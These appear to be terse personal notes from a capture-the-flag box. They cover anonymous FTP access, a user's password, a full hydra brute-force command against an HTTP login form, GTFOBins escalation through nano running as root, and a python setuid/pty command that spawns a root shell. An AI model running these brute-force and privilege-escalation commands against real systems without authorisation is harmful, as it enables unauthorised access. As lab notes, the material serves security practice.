ftp has files on anonymous login with ls -la. //Maybe use "binary" or "quote PASV"

rcampbell user from ftp note 

rcampbell	kristina \\use hydra to bruteforce password
also same for gcrawford

gcrawford has nano running with root privleges \\check with gtfobins to get root

http://<IP>/backdoor is a login page with /backdoor/shell 
user is plague and we can use hydra with 
"hydra <IP> http-post-form '/api/login:username=^USER^&password=^PASS^:Incorrect' -l plague -P ~/rockyou.txt -t 64"

In rcampbell shell, use "python3 -c "import os,pty; os.setuid(0); pty.spawn('/bin/bash')"

there is a flag on gcrawford directory.

